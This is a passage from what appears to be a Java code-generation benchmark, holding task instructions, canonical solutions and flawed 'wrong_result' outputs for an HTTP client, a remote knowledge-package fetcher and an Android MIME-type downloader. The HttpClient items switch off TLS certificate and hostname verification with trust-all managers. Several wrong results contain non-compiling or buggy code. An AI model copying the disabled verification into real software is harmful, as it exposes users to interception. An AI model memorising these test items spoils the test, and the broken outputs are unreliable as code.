    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.json.JSONObject;\n\npublic class RemoteServiceImpl {\n    private String resporityServerUrl;\n    private static final Logger log = LoggerFactory.getLogger(RemoteServiceImpl.class);\n\n    public KnowledgePackage getKnowledge(String packageId, String timestamp) {\n        String response = sendRequest(packageId, timestamp);\n        return parseResponse(response);\n    }\n\n    private String sendRequest(String packageId, String timestamp) {\n        try {\n            URL url = new URL(resporityServerUrl + \"?packageId=\" + packageId + \"&timestamp=\" + timestamp);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            int responseCode = connection.getResponseCode();\n            if (responseCode == 200) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line);\n                }\n                reader.close();\n                return response.toString();\n            } else {\n                log.error(\"HTTP error code: \" + responseCode);\n                throw new RuntimeException(\"HTTP error: \" + responseCode);\n            }\n        } catch (Exception e) {\n            log.error(\"Error during HTTP request: \", e);\n            throw new RuntimeException(\"HTTP request failed\", e);\n        }\n    }\n\n    public void setResporityServerUrl(String resporityServerUrl) {\n        String defaultEndpoint = \"/api/knowledge-packages\";\n        if (!resporityServerUrl.endsWith(defaultEndpoint)) {\n            this.resporityServerUrl = resporityServerUrl + defaultEndpoint;\n        } else {\n            this.resporityServerUrl = resporityServerUrl;\n        }\n    }\n\n    private KnowledgePackage parseResponse(String response) {\n        try {\n            JSONObject json = new JSONObject(response);\n            KnowledgePackage kp = new KnowledgePackage();\n            kp.setId(json.getString(\"id\"));\n            kp.setTimestamp(json.getString(\"timestamp\"));\n            kp.setContent(json.getString(\"content\"));\n            return kp;\n        } catch (Exception e) {\n            log.error(\"Error parsing response: \", e);\n            throw new RuntimeException(\"Failed to parse response\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a Java HTTP client class that handles HTTP/HTTPS requests with support for proxies, custom headers, cookies, and request body configuration. The class should manage SSL verification, connection timeouts, and proper resource cleanup.\n\nClass Description: The HttpClient class provides functionality to send HTTP requests and receive responses. It handles SSL certificate verification (with optional bypass), proxy configuration, request customization, and response processing. The class maintains static configuration and includes utility methods for connection management.\n\nAttributes:\n\nconfig: [Config] - Singleton instance holding configuration settings like proxy information and cookie names\n\nMethods:\n\nsendRequest: [sendRequest]([HttpRequestInfo httpRequestInfo, String cookieValue]) -> [String] - Main method to send HTTP requests. Takes request info and cookie value, returns response body as string or null on failure.\n\ncreateConnection: [createConnection]([HttpRequestInfo httpRequestInfo]) -> [HttpURLConnection] - Creates and returns a connection object, optionally through a proxy if configured.\n\nconfigureRequest: [configureRequest]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue]) -> [void] - Configures request method, headers, and cookies on the connection object.\n\nconfigureCookie: [configureCookie]([Map<String,String> headers, String cookieValue]) -> [void] - Handles cookie manipulation in request headers.\n\nsendRequestBody: [sendRequestBody]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo]) -> [void] - Sends request body data if present in the request info.\n\ncloseResources: [closeResources]([HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos]) -> [void] - Safely closes all connection-related resources.",
    "Canonical_solution": "import javax.net.ssl.*;\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class HttpClient {\n    private static Config config = Config.getInstance();\n\n    static {\n        try {\n            SSLContext sslcontext = SSLContext.getInstance(\"SSL\");\n            sslcontext.init(null, new TrustManager[]{new MyX509TrustManager()}, null);\n            HostnameVerifier ignoreHostnameVerifier = (s, sslsession) -> true;\n            HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());\n        } catch (NoSuchAlgorithmException | KeyManagementException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            connection = createConnection(httpRequestInfo);\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n\n            connection.setConnectTimeout(20000);\n            connection.setReadTimeout(20000);\n            connection.connect();\n\n            inputStream = connection.getInputStream();\n            if (inputStream.available() > 0) {\n                byte[] buffer = new byte[inputStream.available()];\n                inputStream.read(buffer);\n                baos.write(buffer, 0, buffer.length);\n            }\n        } catch (Exception e) {\n            return null;\n        } finally {\n            closeResources(connection, inputStream, baos);\n        }\n        return baos.toString();\n    }\n\n    private static HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) throws IOException {\n        if (config.isProxyEnabled()) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyIP(), config.getProxyPort()));\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection(proxy);\n        } else {\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection();\n        }\n    }\n\n    private static void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) {\n        connection.setRequestMethod(httpRequestInfo.getRequestMethod());\n        Map<String, String> headers = new HashMap<>();\n        if (httpRequestInfo.getHeaders().size() > 0) {\n            headers.putAll(httpRequestInfo.getHeaders());\n        } else {\n            headers.put(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\");\n        }\n        configureCookie(headers, cookieValue);\n        headers.forEach(connection::setRequestProperty);\n        connection.setRequestProperty(\"connection\", \"close\");\n    }\n\n    private static void configureCookie(Map<String, String> headers, String cookieValue) {\n        String cookie = headers.get(\"Cookie\");\n        if (cookie == null) {\n            headers.put(\"Cookie\", config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else if (!cookie.contains(config.getRememberMeCookieName() + \"=\")) {\n            headers.put(\"Cookie\", cookie + \"; \" + config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else {\n            int start = cookie.indexOf(config.getRememberMeCookieName()) + config.getRememberMeCookieName().length() + 1;\n            int end = cookie.indexOf(\";\", start);\n            end = end == -1 ? cookie.length() : end;\n            headers.put(\"Cookie\", cookie.substring(0, start) + cookieValue + cookie.substring(end));\n        }\n    }\n\n    private static void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        String requestBody = httpRequestInfo.getRequestBody();\n        if (requestBody != null && !requestBody.trim().equals(\"\")) {\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            PrintWriter printWriter = new PrintWriter(connection.getOutputStream());\n            printWriter.write(requestBody);\n            printWriter.flush();\n        }\n    }\n\n    private static void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        try {\n            if (connection != null) connection.disconnect();\n            if (inputStream != null) inputStream.close();\n            if (baos != null) baos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClient {\n    private static final Config config = Config.getInstance();\n\n    public static class Config {\n        private static final Config INSTANCE = new Config();\n        private String proxyHost;\n        private int proxyPort;\n        private boolean bypassSSL;\n        private int connectionTimeout;\n        private int readTimeout;\n        private String cookieName;\n\n        public static Config getInstance() {\n            return INSTANCE;\n        }\n\n        public String getProxyHost() { return proxyHost; }\n        public int getProxyPort() { return proxyPort; }\n        public boolean isBypassSSL() { return bypassSSL; }\n        public int getConnectionTimeout() { return connectionTimeout; }\n        public int getReadTimeout() { return readTimeout; }\n        public String getCookieName() { return cookieName; }\n\n        public void setProxyHost(String proxyHost) { this.proxyHost = proxyHost; }\n        public void setProxyPort(int proxyPort) { this.proxyPort = proxyPort; }\n        public void setBypassSSL(boolean bypassSSL) { this.bypassSSL = bypassSSL; }\n        public void setConnectionTimeout(int connectionTimeout) { this.connectionTimeout = connectionTimeout; }\n        public void setReadTimeout(int readTimeout) { this.readTimeout = readTimeout; }\n        public void setCookieName(String cookieName) { this.cookieName = cookieName; }\n    }\n\n    public String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        try {\n            HttpURLConnection connection = createConnection(httpRequestInfo);\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n            return readResponse(connection, cookieValue);\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            closeResources(connection, null, null);\n        }\n    }\n\n    private HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) throws Exception {\n        URL url = new URL(httpRequestInfo.getUrl());\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        if (config.getProxyHost() != null) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyHost(), config.getProxyPort()));\n            connection.setProxy(proxy);\n        }\n        connection.setConnectTimeout(config.getConnectionTimeout());\n        connection.setReadTimeout(config.getReadTimeout());\n        configureSSL(connection);\n        return connection;\n    }\n\n    private void configureSSL(HttpURLConnection connection) {\n        if (config.isBypassSSL()) {\n            TrustManager[] trustAllCerts = new TrustManager[] {\n                new X509TrustManager() {\n                    public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n                }\n            };\n            try {\n                SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n                sslContext.init(null, trustAllCerts, new SecureRandom());\n                connection.setSSLSocketFactory(sslContext.getSocketFactory());\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) throws IOException {\n        connection.setRequestMethod(httpRequestInfo.getMethod());\n        Map<String, String> headers = httpRequestInfo.getHeaders();\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n        configureCookie(headers, cookieValue);\n    }\n\n    private void configureCookie(Map<String, String> headers, String cookieValue) {\n        if (cookieValue != null && !cookieValue.isEmpty()) {\n            headers.put(config.getCookieName(), cookieValue);\n        }\n    }\n\n    private void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        if (httpRequestInfo.getBody() != null) {\n            connection.setDoOutput(true);\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = httpRequestInfo.getBody().getBytes();\n                os.write(input);\n                os.flush();\n            }\n        }\n    }\n\n    private String readResponse(HttpURLConnection connection, String cookieValue) throws IOException {\n        int responseCode = connection.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            try (InputStream inputStream = connection.getInputStream();\n                 ByteArrayOutputStream baos = new ByteArrayOutputStream()) {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    baos.write(buffer, 0, bytesRead);\n                }\n                return baos.toString(\"UTF-8\");\n            }\n        } else {\n            try (InputStream inputStream = connection.getErrorStream();\n                 ByteArrayOutputStream baos = new ByteArrayOutputStream()) {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    baos.write(buffer, 0, bytesRead);\n                }\n                return baos.toString(\"UTF-8\");\n            }\n        }\n    }\n\n    private void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        if (baos != null) {\n            try {\n                baos.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 99,
    "Instruction": "Task Description: Create a class that handles fetching MIME types from URLs and managing download requests using Android's DownloadManager.\n\nClass Description: The FetchUrlMimeType class is responsible for determining the MIME type of a resource at a given URL, setting up a download request with appropriate parameters, and enqueuing the download using Android's DownloadManager. It handles HTTP connections, processes response headers, and manages file naming and destination.\n\nAttributes:\n- mRequest: [DownloadManager.Request] - The download request to be configured and enqueued\n- mDownloadManager: [DownloadManager] - The Android DownloadManager instance used to enqueue downloads\n- mUri: [String] - The URL of the resource to be downloaded\n- mCookies: [String] - Optional cookies to be included in the HTTP request\n- mUserAgent: [String] - The user agent string to be used in the HTTP request\n\nMethods:\n- Constructor: [FetchUrlMimeType](DownloadManager downloadManager, DownloadManager.Request request, String uri, String cookies, String userAgent) -> [void] - Initializes the class with download manager, request, URI, cookies, and user agent\n- create: [create]() -> [Single<Result>] - Creates and executes the download process, returning a Single observable with the result status. This method:\n  1. Establishes an HTTP connection to the URL\n  2. Extracts MIME type and content disposition from headers\n  3. Configures the download request with proper MIME type and filename\n  4. Enqueues the download request\n  5. Returns success/failure status through the observable\n\nNested Enum:\n- Result: [enum] - Represents possible outcomes of the download enqueue operation:\n  - FAILURE_ENQUEUE: Failed to enqueue the download request\n  - FAILURE_LOCATION: Failed due to storage location issues\n  - SUCCESS: Download successfully enqueued",
    "Canonical_solution": "import android.app.DownloadManager;\nimport android.os.Environment;\nimport android.util.Log;\nimport android.webkit.MimeTypeMap;\nimport android.webkit.URLUtil;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nimport acr.browser.lightning.utils.Utils;\nimport androidx.annotation.NonNull;\nimport io.reactivex.rxjava3.core.Single;\n\nclass FetchUrlMimeType {\n\n    private static final String TAG = \"FetchUrlMimeType\";\n\n    private final DownloadManager.Request mRequest;\n    private final DownloadManager mDownloadManager;\n    private final String mUri;\n    private final String mCookies;\n    private final String mUserAgent;\n\n    public FetchUrlMimeType(DownloadManager downloadManager,\n                            DownloadManager.Request request,\n                            String uri,\n                            String cookies,\n                            String userAgent) {\n        mRequest = request;\n        mDownloadManager = downloadManager;\n        mUri = uri;\n        mCookies = cookies;\n        mUserAgent = userAgent;\n    }\n\n    public Single<Result> create() {\n        return Single.create(emitter -> {\n            String mimeType = null;\n            String contentDisposition = null;\n            HttpURLConnection connection = null;\n            try {\n                URL url = new URL(mUri);\n                connection = (HttpURLConnection) url.openConnection();\n                if (mCookies != null && !mCookies.isEmpty()) {\n                    connection.addRequestProperty(\"Cookie\", mCookies);\n                    connection.setRequestProperty(\"User-Agent\", mUserAgent);\n                }\n                connection.connect();\n                if (connection.getResponseCode() == 200) {\n                    String header = connection.getHeaderField(\"Content-Type\");\n                    if (header != null) {\n                        mimeType = header;\n                        final int semicolonIndex = mimeType.indexOf(';');\n                        if (semicolonIndex != -1) {\n                            mimeType = mimeType.substring(0, semicolonIndex);\n                        }\n                    }\n                    String contentDispositionHeader = connection.getHeaderField(\"Content-Disposition\");\n                    if (contentDispositionHeader != null) {\n                        contentDisposition = contentDispositionHeader;\n                    }\n                }\n            } catch (@NonNull IllegalArgumentException | IOException ex) {\n                if (connection != null)\n                    connection.disconnect();\n            } finally {\n                if (connection != null)\n                    connection.disconnect();\n            }\n\n            if (mimeType != null) {\n                if (mimeType.equalsIgnoreCase(\"text/plain\")\n                    || mimeType.equalsIgnoreCase(\"application/octet-stream\")) {\n                    String newMimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(\n                        Utils.guessFileExtension(mUri));\n                    if (newMimeType != null) {\n                        mRequest.setMimeType(newMimeType);\n                    }\n                }\n                final String filename = URLUtil.guessFileName(mUri, contentDisposition, mimeType);\n                mRequest.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename);\n            }\n\n            try {\n                mDownloadManager.enqueue(mRequest);\n                emitter.onSuccess(Result.SUCCESS);\n            } catch (IllegalArgumentException e) {\n                Log.e(TAG, \"Unable to enqueue request\", e);\n                emitter.onSuccess(Result.FAILURE_ENQUEUE);\n            } catch (SecurityException e) {\n                emitter.onSuccess(Result.FAILURE_LOCATION);\n            }\n        });\n    }\n\n    enum Result {\n        FAILURE_ENQUEUE,\n        FAILURE_LOCATION,\n        SUCCESS\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class FetchUrlMimeType {\n    private DownloadManager mDownloadManager;\n    private DownloadManager.Request mRequest;\n    private String mUri;\n    private String mCookies;\n    private String mUserAgent;\n\n    public FetchUrlMimeType(DownloadManager downloadManager, DownloadManager.Request request, String uri, String cookies, String userAgent) {\n        mDownloadManager = downloadManager;\n        mRequest = request;\n        mUri = uri;\n        mCookies = cookies;\n        mUserAgent = userAgent;\n    }\n\n    public Single<Result> create() {\n        return Single.create(emitter -> {\n            try {\n                URL url = new URL(mUri);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                if (mCookies != null) {\n                    connection.setRequestProperty(\"Cookie\", mCookies);\n                }\n                if (mUserAgent != null) {\n                    connection.setRequestProperty(\"User-Agent\", mUserAgent);\n                }\n                connection.connect();\n\n                int responseCode = connection.getResponseCode();\n                if (responseCode >= 400) {\n                    emitter.onSuccess(Result.FAILURE_ENQUEUE);\n                    return;\n                }\n\n                String mimeType = connection.getContentType();\n                String contentDisposition = connection.getHeaderField(\"Content-Disposition\");\n                String fileName = null;\n\n                if (contentDisposition != null) {\n                    int index = contentDisposition.indexOf(\"filename=\");\n                    if (index != -1) {\n                        index += \"filename=\".length();\n                        int end = contentDisposition.length();\n                        if (contentDisposition.charAt(index) == '\"') {\n                            end = contentDisposition.indexOf('\"', index + 1);\n                        } else {\n                            end = contentDisposition.indexOf(';', index);\n                        }\n                        if (end != -1) {\n                            fileName = contentDisposition.substring(index, end);\n                        }\n                    }\n                }\n\n                mRequest.setMimeType(mimeType);\n                mRequest.setTitle(fileName != null ? fileName : mUri);\n                mRequest.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, fileName != null ? fileName : \"default_file\");\n\n                long reference = mDownloadManager.enqueue(mRequest);\n                if (reference == -1) {\n                    emitter.onSuccess(Result.FAILURE_ENQUEUE);\n                } else {\n                    emitter.onSuccess(Result.SUCCESS);\n                }\n            } catch (Exception e) {\n                emitter.onSuccess(Result.FAILURE_ENQUEUE);\n            }\n        });\n    }\n\n    public enum Result {\n        FAILURE_ENQUEUE,\n        FAILURE_LOCATION,\n        SUCCESS\n    }\n}"
  }
]